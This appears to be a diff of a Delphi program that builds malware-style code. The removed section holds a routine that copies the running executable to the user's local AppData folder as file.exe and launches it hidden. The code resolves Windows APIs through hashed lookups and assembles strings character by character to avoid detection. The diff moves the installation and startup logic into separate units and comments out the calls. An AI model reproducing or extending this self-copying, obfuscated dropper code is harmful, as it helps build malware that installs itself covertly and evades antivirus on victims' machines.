@@ -1,66 +1,17 @@
 program Project1;
 
 uses
-  Windows;
-
-type
-  TAPIRec = packed record
-    hKernel32, hUser32, hShell32, hShFolder : Cardinal;
-    xExitProcess:procedure(uExitCode: UINT); stdcall;
-    xLoadLibraryA:function(lpLibFileName: PChar): Cardinal; stdcall;
-    xMessageBoxW:function(hWnd: HWND; lpText, lpCaption: PWideChar; uType: UINT): Integer; stdcall;
-    xVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
-    xGetModuleFileNameW:function(hModule: HINST; lpFilename: PWideChar; nSize: DWORD): DWORD; stdcall;
-    xlstrlenW:function(lpString: PWideChar): Integer; stdcall;
-    xlstrcmpW:function(lpString1, lpString2: PWideChar): Integer; stdcall;
-    xlstrcatW:function(lpString1, lpString2: PWideChar): PWideChar; stdcall;
-    xCopyFileW:function(lpExistingFileName, lpNewFileName: PWideChar; bFailIfExists: BOOL): BOOL; stdcall;
-    xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
-    xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
-  end;
-  PAPIRec = ^TAPIRec;
-
-const
-  CSIDL_LOCAL_APPDATA        = $001C;
-
-function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;
-begin
-  Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
-end;
-
-function GetCurrentDir(pAPI:PAPIRec):PWideChar;
-begin
-  Result := AllocMem(pAPI, MAX_PATH * 2);
-  if Result <> nil then
-    pAPI.xGetModuleFileNameW(0, Result, MAX_PATH * 2);
-end;
-
-function LocalAppDataPath(pAPI:PAPIRec): PWideChar;
-const
-  SHGFP_TYPE_CURRENT = 0;
-var
-  strFileName:Array[0..11] of WideChar;
-begin
-  strFileName[0]:='\';strFileName[1]:='f';strFileName[2]:='i';strFileName[3]:='l';strFileName[4]:='e';strFileName[5]:='.';strFileName[6]:='e';strFileName[7]:='x';strFileName[8]:='e';strFileName[9]:=#0;
-  Result := AllocMem(pAPI, MAX_PATH * 2);
-  pAPI.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, 0, Result);
-  pAPI.xlstrcatW(Result, @strFileName);
-end;
-
-procedure CopyMySelf(pAPI:PAPIRec);
-var
-  pCurrDirectory, pDestinationDirectory:PWideChar;
-begin
-  pCurrDirectory := GetCurrentDir(pAPI);
-  pDestinationDirectory := LocalAppDataPath(pAPI);
-  if pAPI.xlstrcmpw(pCurrDirectory, pDestinationDirectory) <> 0 then
-  begin
-    pAPI.xCopyFileW(pCurrDirectory, pDestinationDirectory, False);
-    pAPI.xShellExecuteW(0, nil, pDestinationDirectory, nil, nil, 0);
-  end;
-end;
+  Windows,
+  untStartUp in 'untStartUp.pas',
+  untUtils in 'untUtils.pas',
+  untInstallation in 'untInstallation.pas';
 
 procedure resolver;
+  function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
+  begin
+    Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
+  end;
+
   procedure LoadLib(pAPI:PAPIRec);stdcall;
   var
     strUser32:Array[0..10] of Char;
@@ -126,6 +77,7 @@ procedure resolver;
   procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
   begin
     pAPI.hKernel32 := hKernel32;
+    pAPI.xAllocMem := @AllocMem;
     pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
     LoadLib(pAPI);
     pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
@@ -138,6 +90,7 @@ procedure resolver;
     pAPI.xCopyFileW := GetProcAddressEx(hKernel32, $F54D69C8, 9);
     pAPI.xShellExecuteW := GetProcAddressEx(pAPI.hShell32, $1FA8A1D9, 13);
     pAPI.xSHGetFolderPathW := GetProcAddressEx(pAPI.hShell32, $C7652B3F, 16);
+    pAPI.xwsprintfW := GetProcAddressEx(pAPI.hUser32, $201D0DD6, 9);
   end;
 
 var
@@ -161,12 +114,13 @@ begin
     MOV hModule, EAX
   end;
   @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
-  //API resolution
   pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
   LoadAPIs(pAPI, hKernel32);
-  pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
-  CopyMySelf(pAPI);
-  pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
+  
+  //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
+  //StartUp(pAPI);
+  //CopyMySelf(pAPI);
+  //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
   pAPI.xExitProcess(0);
 end;
 
